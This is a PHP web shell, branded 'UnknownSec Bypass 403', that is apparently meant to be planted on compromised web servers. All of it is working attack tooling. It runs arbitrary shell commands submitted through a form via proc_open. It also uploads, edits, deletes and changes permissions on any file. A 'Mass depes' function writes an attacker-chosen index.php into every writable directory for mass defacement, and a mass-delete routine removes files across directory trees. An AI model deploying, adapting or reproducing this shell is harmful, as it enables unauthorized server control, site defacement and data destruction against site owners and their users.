<?php
/*! 
Recoded? only changed and delete copyright? Don't be a bastard dude!
~ Kata Bang zerobyte.id.
~ Ngikutin Bang Unknown45
*/
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

if(get_magic_quotes_gpc()){
	foreach($_POST as $key=>$value){
	$_POST[$key] = stripslashes($value);
	}
}
echo '
<!DOCTYPE HTML>
<html>
	<head>
		<meta name="description" content="UnknownSec Ganteng">
		<meta name="author" content="UnknownSec">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
		<title>'.$_SERVER['HTTP_HOST'].' ~ Bypass 403</title>
		<link rel="icon" href="https://unknownsec.us.to/main/logo.jpg" type="image/x-icon">
		<link rel="stylesheet" href="https://unknownsec.us.to/main/style.css" type="text/css">
	</head>
<body>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.js"></script>
	<div class="container">
		<div class="card text-dark">
			<div class="card-header">
				<a href="?"><h4>UnknownSec Bypass <i class="fa fa-globe"></i> 403</h4></a>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<i class="fa fa-terminal"></i> : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
//upload
echo '<p>
	<form method="post" enctype="multipart/form-data">
		<div class="input-group mb-3">
			<div class="custom-file">
					<label class="custom-file-label" for="inputGroupFile04">
				<input class="custom-file-input" id="inputGroupFile04" type="file" name="file" onchange="this.form.submit()" multiple>
					</label>
				</div>
			</div>
		</div>
	</div>
</div>
</form>';
echo '<br />
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<h5><a class='badge badge-secondary' href='?z=def'><i class='fa fa-user-secret'></i> Mass depes</a> - <a class='badge badge-secondary' href='?z=del'><i class='fa fa-trash-o'></i> Mass delete</a> - <a class='badge badge-secondary' href='?z=info'><i class='fa fa-info-circle'></i> Info</a> - <a class='badge badge-secondary' href='?z=abt'><i class='fa fa-info'></i> About</a></h5>";
	echo '</div>
	</div>
</div>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success..!!",
  "Done upload",
  "success"
)
</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss..!!",
  "Failed upload!!",
  "error"
)
</script>
';
}
}
echo '</form></td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td><center><br><b>files : </b>";
echo $_GET['filesrc'];
echo '</center></tr></td></table></br>';
echo('<textarea class="form-control" rows="20" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea><br />');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
//Chmod
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success..!!",
  "Done Change Permission!!",
  "success"
)
</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss..!!",
  "Failed change permission!!",
  "error"
)
</script>
';
}
}
echo '<form method="POST">
<font>Permission</font> : <input class="form-control" name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'"/>
	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
		<input class="form-control" type="hidden" name="opt" value="chmod">
	<input class="btn btn-primary btn-block" type="submit" value=">"/>
</form>';
}
//rename folder
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
<font>New Name</font> : <input class="form-control" name="name" type="text" size="25" value="Folder"/>
	<input class="form-control" type="hidden" name="path" value="'.$cwd.'">
		<input class="form-control" type="hidden" name="opt" value="delete">
	<input class="btn btn-primary btn-block" type="submit" value=">"/>
</form>
<br />';
}
//rename file
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success..!!",
  "Done change name!!",
  "success"
)
</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss..!!",
  "Failed change name!!",
  "error"
)
</script>
';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
<font>New Name</font> : <input class="form-control" name="newname" type="text" size="5" value="'.$_POST['name'].'" />
	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
		<input class="form-control" type="hidden" name="opt" value="rename">
	<input class="btn btn-primary btn-block" type="submit" value=">"/>
</form>
<br />';
}
//edit file
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success..!!",
  "Edit file done!!",
  "success"
)
</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss..!!",
  "Failed edit file!!",
  "error"
)
</script>
';
}
fclose($fp);
}
echo '<form method="POST">
<textarea class="form-control" rows="20" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
		<input class="form-control" type="hidden" name="opt" value="edit">
	<input class="btn btn-primary btn-block" type="submit" value=">"/>
</form><br />';
}
echo '</center>';
}else{
echo '</table><br /><center>';
//delete dir
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success..!!",
  "Done delete dir!!",
  "success"
)
</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss..!!",
  "Failed delete dir!!",
  "error"
)
</script>
';
}
}
//delete file
elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success..!!",
  "Done delete file!!",
  "success"
)
  title: "Done Delete File!!"
})
</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss..!!",
  "Failed delete file!!",
  "error"
)
</script>
';
}
}
}
?>
<?php
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo '<div class="container-fluid"><table class="table table-striped table-bordered table-hover bg-white" cellspacing="0" cellpadding="7" width="100%">
<thead class="table-dark">
	<tr class="first">
		<th><center>Name</center></th>
			<th><center>Size</center></th>
		<th><center>Permission</center></th>
	<th><center>Options</center></th>
</thead>
</tr>
<tr>';
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
	echo "<tr>
<td><i class='fa fa-folder-o'></i><a class=\"ajx\" href=\"?path=$path/$dir\"> $dir</a></td>
	<td><font><center>DIR</center></font></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="#0fa3ff">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FF0004">';
	echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
	echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
	<select class=\"form-control\" name=\"opt\">
		<option selected disabled>Select</option>
			<option value=\"delete\">Delete</option>
		<option value=\"chmod\">Chmod</option>
	<option value=\"rename\">Rename</option>
</select>
<input class=\"form-control\" type=\"hidden\" name=\"type\" value=\"dir\">
	<input class=\"form-control\" type=\"hidden\" name=\"name\" value=\"$dir\">
			<input class=\"form-control\" type=\"hidden\" name=\"path\" value=\"$path/$dir\">
		<input class=\"btn btn-primary btn-block\" type=\"submit\" value=\">\"/>
	</form>
</center></td>
</tr>";
}
foreach($scandir as $file){
	if(!is_file("$path/$file")) continue;
		$size = filesize("$path/$file")/1024;
		$size = round($size,3);
	if($size >= 1024){
		$size = round($size/1024,2).' MB';
	}else{
		$size = $size.' KB';
	}
	echo "<tr>
<td><i class='fa fa-file-o'></i><a class=\"ajx\" href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
	<td><font><center>".$size."</center></font></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="#0fa3ff">';
elseif(!is_readable("$path/$file")) echo '<font color="#FF0004">';
	echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
	echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
	<select class=\"form-control\" name=\"opt\">
		<option selected disabled>Select</option>
			<option value=\"delete\">Delete</option>
		<option value=\"edit\">Edit</option>
	<option value=\"rename\">Rename</option>
<option value=\"chmod\">Chmod</option>
</select>
	<input class=\"form-control\" type=\"hidden\" name=\"type\" value=\"file\">
		<input class=\"form-control\" type=\"hidden\" name=\"name\" value=\"$file\">
			<input class=\"form-control\" type=\"hidden\" name=\"path\" value=\"$path/$file\">
		<input class=\"btn btn-primary btn-block\" type=\"submit\" value=\">\"/>
	</form>
</center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '
	<div class="container">
		<div class="card text-dark">
			<div class="card-header">';
echo '<form method="post"><input class="form-control" type="text" name="cmd" value="ls -la" required><button class="btn btn-primary btn-block" type="submit">submit</button></form>';
echo "<center><font>Copyright &copy; ".date("Y")." - <a href=''>UnknownSec</a></center>";
	echo '</div>
	</div>
</div>';
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "r")
);
$env = array('some_option' => 'aeiou');
$baka = "";
if(isset($_POST['cmd'])){ 
$cmd = ($_POST['cmd']);
echo "<br /><textarea class='form-control' rows='20'>";
$process = proc_open($cmd, $descriptorspec, $pipes, $baka, $env);
echo stream_get_contents($pipes[1]); die; }
echo "</textarea>";
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
	for($i = 0; $i <= $c_dir; $i++) {
		$scdir[$i];
		if($i != $c_dir) {
		}
elseif($_GET['z'] == 'def'){
	function mass_kabeh($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$lokasi = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($lokasi, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($lokasi, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<font color=#0fa3ff>DONE</font>] $lokasi<br>";
						file_put_contents($lokasi, $isi_script);
						$idx = mass_kabeh($dirc,$namafile,$isi_script);
					}
				}
			}
		}
	}
}
function mass_biasa($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$lokasi = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($lokasi, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($lokasi, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<font color=#0fa3ff>DONE</font>] $dirb/$namafile<br>";
						file_put_contents($lokasi, $isi_script);
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	if($_POST['tipe'] == 'massal') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
	mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";
	} elseif($_POST['tipe'] == 'biasa') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
	mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";
	}
	} else {
echo "<br /><center>";
echo "<form method='post'>
	<font>Tipe:</font><br>
	<div style='border: 2px solid #fff; border-radius:10px; width: 50%;'/>
	<input type='radio' name='tipe' value='biasa' checked>Biasa<input type='radio' name='tipe' value='massal'>Massa</div><br>
	<font><i class='fa fa-folder-o'></i> Dir:</font><br>
	<input class='form-control' type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font><i class='fa fa-file-o'></i> File name:</font><br>
	<input class='form-control' type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font><i class='fa fa-file-o'></i> Your script:</font><br>
	<textarea class='form-control' rows='20' name='script'>Tuoched By UnknownSec</textarea><br />
	<input type='submit' name='start' value='Gass!' class='btn btn-primary btn-block'>
	</form>";
	}
}
elseif($_GET['z'] == 'info') {
function get_client_ip() {
	$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
	$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ipaddress = getenv('REMOTE_ADDR');
else
	$ipaddress = 'IP tidak dikenali';
return $ipaddress;
}
echo '<br />
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<b>Uname :</b> <i>".php_uname()."</i><br />";
echo "<b>Your Ip :</b> <i>".get_client_ip()."</i><br />";
echo "<b>Server Ip :</b> <i>".gethostbyname($_SERVER['HTTP_HOST'])."</i><br />";
	echo '</div>
	</div>
</div>';
}
elseif($_GET['z'] == 'abt'){
echo '<br />
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<b>- About -</b><br />";
echo "Thanks bre dah pake shell nya, jika ada yang error silahkan contact email di bawah<br />Greetz : <a href=''>{ AnonSec Team } - And You</a><br />My email: <a href='mailto:tukanghek@protonmail.com'>tukanghek@protonmail.com</a>";
	echo '</div>
	</div>
</div>';
}
elseif($_GET['z'] == 'del') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=#0fa3ff>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
		echo "<center><a href='?'><- kembali</a></center>";
	} else {
	echo "<br /><center>";
	echo "<form method='post'>
	<font><i class='fa fa-folder-o'></i> Dir:</font><br>
	<input class='form-control' type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font><i class='fa fa-file-o'></i> File name:</font><br>
	<input class='form-control' type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input class='btn btn-primary btn-block' type='submit' name='start' value='Gass!'>
	</form>
	</div>
	</div>
	</div>
</html>";
		}
	}
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
?>